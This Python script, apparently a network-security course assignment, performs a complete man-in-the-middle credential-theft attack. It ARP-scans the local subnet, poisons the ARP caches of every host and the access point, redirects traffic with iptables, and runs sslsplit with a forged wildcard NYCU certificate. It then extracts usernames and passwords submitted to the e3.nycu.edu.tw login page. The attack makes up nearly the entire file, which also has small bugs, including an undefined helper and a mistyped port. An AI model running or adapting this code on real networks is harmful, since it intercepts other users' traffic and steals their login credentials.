#!/usr/bin/env python3

import os
import time
import subprocess
from scapy.all import *

TEST_WEB_PAGE = 'https://e3.nycu.edu.tw/login/index.php'
AP_IP = '192.168.92.2'
AP_MAC = '00:50:56:f1:2b:c4'

class COLOR:
    BLACK  = '\x1b[30m'
    RED    = '\x1b[31m'
    GREEN  = '\x1b[32m'
    YELLOW = '\x1b[33m'
    BLUE   = '\x1b[34m'
    VIOLET = '\x1b[35m'
    BEIGE  = '\x1b[36m'
    RESET  = '\x1b[0m'

def cmd(command):
    subprocess.run(command, shell=True)

def scan_ip_mac():
    """Scan IP and MAC address of available devices

    Suppose the host only have two interfaces:
    One is 'lo', the another one is the one to be used.

    Scan availble devices by arping on the subnet of the target interface.
    Collect corresponding IP and MAC from the response packet.

    :returns: target interface name, IP to MAC dict
    """
    print(COLOR.YELLOW + 'Scanning for available devices.' + COLOR.RESET)
    # scan interfaces (remove localhost)
    infs = get_if_list()
    infs.remove('lo')
    inf = infs[0]

    ip_mac_dict = {}
    # get ip address of the interface
    inf_ip = get_if_addr(inf)
    idx = inf_ip.rfind('.')
    # arp on the subnet of the interface (answerd, unanswered)
    ans, unans = arping(f"{inf_ip[:idx]}.0/24", verbose=0)
    
    # output
    print('Available devices')
    print('-----------------------------------------')
    print('IP\t\t\tMAC')
    print('-----------------------------------------')
    # (send, response)
    for s, r in ans:
        # store the value in dict
        ip_mac_dict[r[ARP].psrc] = r[Ether].src
    
    # remove AP IP from dict
    ip_mac_dict.pop(AP_IP)

    for key, val in ip_mac_dict.items():
        # print IP and MAC from the packet
        print(f'{key}\t\t{val}')
    

    print()

    return inf, ip_mac_dict

def arp_spoofing_by_all(inf: str, ip_mac_dict: dict, target_ip: str):
    """ARP spoofing by sending to all possible victims

    Send packet to uplink and downlink

    Change the MAC address field to attack's MAC, then send out.
    - Uplink, ARP reply to WiFi AP.
    - Downlink, ARP rerply to victim.

    :param inf: target interface name
    :param ip_mac_dict: IP to MAC dict
    :param target_ip: AP IP or server IP that the attacker claims has
    :returns: none
    """
    # get own MAC
    own_mac = get_if_hwaddr(inf)
    # sent to all possible victims
    print(COLOR.YELLOW + 'Sending ARP spoofing reply packets.' + COLOR.RESET)
    for victim_ip in ip_mac_dict.keys():
        # uplink and downlink
        up_packet = ARP(op=2, hwsrc=own_mac, psrc=victim_ip, pdst=target_ip)
        down_packet = ARP(op=2, hwsrc=own_mac, psrc=target_ip, pdst=victim_ip)

        # send packets (return for debugging)
        up_ret = send(up_packet, return_packets=True, verbose=0)
        down_ret = send(down_packet, return_packets=True, verbose=0)

def arp_spoofing_by_sniffing(inf: str):
    """ARP spoofing by sniffing

    (If victim had not connect to WiFi yet.)
    Victim will try to connect to AP,
    therfore send arp broadcast to find the MAC of WiFi AP.
    Sniff the ARP request packet from victim and spoof the packet with self's info.
    Send out spoofed packets.

    :param inf: interface to sniff
    :returns: none
    """
    # get own MAC
    own_mac = get_if_hwaddr(inf)
    # sniff ARP packets on the interface
    packets = sniff(iface=inf, count=1, filter='arp')
    # find a request packet
    for packet in packets:
        if packet[ARP].op == 1: # request (who has  = 1)
            target_packet = packet
            break
        else: # response (is at = 2)
            continue
    # parse information from the target packet
    victim_ip = target_packet[ARP].psrc
    ap_ip = target_packet[ARP].pdst
    # fabricate and send ARP reply packets
    send_packets(victim_ip, ap_ip, own_mac)
    print(COLOR.YELLOW + 'ARP spoofing packets sent.' + COLOR.RESET)

def parse_line(tokenline: str):
    """Parse the given line

    Get username and password from the line and print out.

    :param tokenline: tokenline
    :returns: none
    """
    # parse lines
    tokens = tokenline.split('&')
    # parse username
    uname = tokens[1].split('=')[1]
    # parse password
    passwd = tokens[2].split('=')[1]

    print(f'Username:\t{uname}')
    print(f'Password:\t{passwd}')

def parse_login_token(logfolder: str):
    """Looking for files containing specific token (logintoken)

    :param logfolder: path to log folder
    :returns: a line with logintoken
    """
    # record logintoken file dict and token count in the file
    file_dict = {}
    while True:
        logfiles = os.listdir(logfolder)
        for logfile in logfiles:
            # not the file we are looking for
            if not logfile.endswith('140.113.41.24,443.log'):
                continue
            # check if is a new file
            if logfile not in file_dict.keys():
                file_dict[logfile] = 0
            # open file and get lines with logintoken exist
            with open(logfolder + '/' + logfile, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            lines = [x for x in lines if 'logintoken=' in x]
            # update
            if len(lines) > file_dict[logfile]:
                for i in range(file_dict[logfile], len(lines)):
                    parse_line(lines[i])
                file_dict[logfile] = len(lines)
        # if new file exists
        if len(os.listdir(logfolder)) > len(logfiles):
            continue
        else:
            time.sleep(1)

def ssl_generate_key():
    """Generate RSA key and certificate
    """
    cmd('openssl rand -writerand ~/.rnd')
    cmd('openssl genrsa -out ca.key 4096')
    command = 'openssl req -new -x509 -days 30 -key ca.key -out ca.crt '
    config = '-subj "/C=TW/ST=Taiwan/L=Hsinchu/O=NYCU/OU=HSINCHU/CN=*.NYCU.EDU.TW"'
    cmd(command + config)

def ssl_prerequisites():
    """SSL spliting prerequisites

    Setting sysconfig and iptables redirecting
    """
    # activate forwarding
    cmd('sysctl -w net.ipv4.ip_forward=1')
    # clear table
    cmd('iptables -t nat -F')
    # redirect non-SSL TCP connections to 8080
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080')
    # redirect HTTPS TCP (443) to 8443
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
    # redirect SSL SMTP (465, 587) to 8443
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 456 -j REDIRECT --to-ports 8443')
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443')
    # redirect SSL IMAP (993) to 8443
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443')

def ssl_spliting():
    """SSL spliting on encrypted SSL/TLS connections

    - Do prerequisites
    - Generate RSA key and certificate (do in makefile)
    - SSL split and wait for connections and inputs
    - Parse intercepted HTTP contents for username and password
    """
    # prerequisites
    ssl_prerequisites()
    # generate RSA key and certificate (this will be done in make)
    #ssl_generate_key()

    # check if folder exists
    if (not os.path.exists('tmp')):
        cmd('mkdir tmp')
    if (not os.path.exists('tmp/logdir')):
        cmd('mkdir tmp/logdir')
    if (not os.path.exists('tmp/jaildir')):
        cmd('mkdir tmp/jaildir')

    try:
        print()
        print(COLOR.YELLOW + 'SSL spliting to fetch contents.' + COLOR.RESET)
        print(COLOR.VIOLET + 'To stop SSL spliting, press ctrl+c.' + COLOR.RESET)
        # run sslsplit (in background)
        cmd('sslsplit -d \
            -l connections.log \
            -j tmp/jaildir \
            -S tmp/logdir \
            -k ca.key -c ca.crt \
            ssl 0.0.0.0 8443 \
            tcp 0.0.0.0 8080')
        # parse intercepted information
        parse_login_token('tmp/logdir')
    except KeyboardInterrupt:
        # finished sslspliting, stop sslsplit process
        cmd('sudo killall sslsplit')
        # clear iptables
        cmd("iptables --flush")
        print(COLOR.RED + 'Stop SSL spliting.' + COLOR.RESET)
        return

def main():
    """Main program

    Containing three tasks:
    1. Scan available devices IPs and MACs
    2. ARP spoofing
    3. SSL spliting on encrypted connections
    """
    ### task 1 ###
    inf, ip_mac_dict = scan_ip_mac()

    ### task 2 ###
    arp_spoofing_by_all(inf, ip_mac_dict, AP_IP)
    #arp_spoofing_by_sniffing(inf)

    ### task 3 ###
    ssl_spliting()

if __name__ == '__main__':
    main()